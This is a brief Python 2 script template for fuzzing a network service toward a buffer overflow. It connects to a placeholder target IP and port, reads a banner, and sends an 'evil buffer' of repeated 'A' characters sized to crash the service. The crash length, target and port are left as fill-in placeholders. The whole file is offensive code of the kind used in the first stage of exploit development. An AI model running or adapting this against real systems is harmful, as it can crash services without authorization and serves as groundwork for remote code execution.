#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * <NUM_OF_BYTES_THAT_CRASH_THIS_SHIT>

try:
	print "[Info] Sending evil buffer..."
	s.connect(('<TARGET_IP_ADDRESS>',<TARGET_PORT>))
	data = s.recv(1024)
	s.send(buffer + '\r\n')
	data = s.recv(1024)
	print "\n[Info] Done!"
except:
  print "Could not connect to port <TARGET_IP_ADDRESS>:<TARGET_PORT>!"
